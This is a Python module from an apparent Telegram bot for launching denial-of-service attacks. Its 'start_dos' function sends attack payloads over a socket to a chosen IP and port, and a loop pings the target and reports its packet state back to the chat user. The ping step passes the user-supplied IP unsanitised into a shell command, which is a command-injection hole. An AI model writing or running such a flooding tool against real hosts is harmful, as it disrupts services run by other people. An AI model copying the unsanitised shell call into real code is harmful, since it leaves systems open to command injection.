import asyncio
import logging
import os.path

from aiogram.dispatcher.storage import FSMContextProxy
from aiogram.types import Message

from loader import dp


async def get_timeout():
    await asyncio.sleep(600)


async def get_ping(message: Message, dos_data: FSMContextProxy):
    current_path = os.path.dirname(os.path.abspath(__file__))
    msg = await message.answer(f"Текущее состояние пакетов по данному IP-адресу:")
    while await dp.current_state().get_state() != 'DosState:stopped_script':
        cmd = f"sh '{current_path}/ping.sh' {dos_data['ip']}"
        proc = await asyncio.create_subprocess_shell(
            cmd=cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        await msg.edit_text(f"Текущее состояние пакетов по данному IP-адресу:\n{stdout.decode()}")


async def start_dos(connect, ip: str, port: int, attack: bytes):
    connect.sendto(attack, (ip, port))
